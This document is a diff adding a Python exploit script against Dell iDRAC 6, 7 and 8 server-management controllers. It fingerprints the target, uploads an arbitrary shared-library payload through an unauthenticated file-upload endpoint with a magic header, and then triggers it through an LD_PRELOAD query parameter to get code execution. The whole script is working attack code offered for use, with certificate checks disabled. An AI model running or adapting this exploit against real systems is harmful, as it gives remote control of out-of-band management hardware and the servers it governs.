@@ -1,0 +1,71 @@
+#!/usr/bin/env python3
+
+# On vulnerable DRACs, will use LD_PRELOAD to load and execute payload.so
+
+import ipaddress
+import logging
+import os
+import requests
+import struct
+import sys
+import urllib3
+
+LOGLEVEL = os.environ.get('LOGLEVEL', 'WARNING').upper()
+logging.basicConfig(level=LOGLEVEL)
+logger = logging.getLogger(os.path.basename(__file__))
+
+def get_host():
+    try:
+        return ipaddress.ip_address(sys.argv[1])
+    except:
+        print(f"Usage: {sys.argv[0]} ip")
+        sys.exit(1)
+
+
+def upload_payload(session, host, payload):
+    # From https://www.immunityinc.com/downloads/The-Unbearable-Lightness-of-BMC-wp.pdf
+    # pp. 14-15
+
+    data = b"RACPKSSHAUTHKEY1" + b"\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0"
+    data += struct.pack('<L', len(payload)) + struct.pack('<L', 1)
+    data += payload
+
+    return session.post(f"https://{host}/cgi-bin/putfile", data=data)
+
+def main():
+    host = get_host()
+
+    s = requests.Session()
+    # Many DRACs have invalid certs
+    s.verify = False
+    urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
+
+    home = s.get(f"https://{host}/")
+    is_drac = b"isSCenabled" in home.content
+    # DRAC 9 unsupported
+    # is_drac |= b"""<html ng-app='loginapp' ng-controller="loginController" ng-init="onInit(0)">""" in home.content
+    if is_drac:
+        logger.info("DRAC detected")
+    else:
+        logger.error("Does not appear to be a DRAC 6, 7, or 8. Could not find 'isSCenabled' in content")
+        sys.exit(1)
+
+    try:
+        with open("payload.so", 'r+b') as f:
+            payload = f.read()
+    except:
+        logger.fatal("Could not read payload.so", exc_info=True)
+
+    response = upload_payload(s, host, payload)
+    if response.status_code != 200:
+        logger.fatal(f"Could not upload payload; received {response.status_code}")
+        sys.exit(1)
+
+    logger.info("Payload successfully uploaded")
+
+    loot = s.get(f"https://{host}/cgi-bin/discover?LD_PRELOAD=/tmp/sshpkauthupload.tmp")
+    logger.info("Attempting to execute payload")
+
+if __name__ == "__main__":
+    main()
+
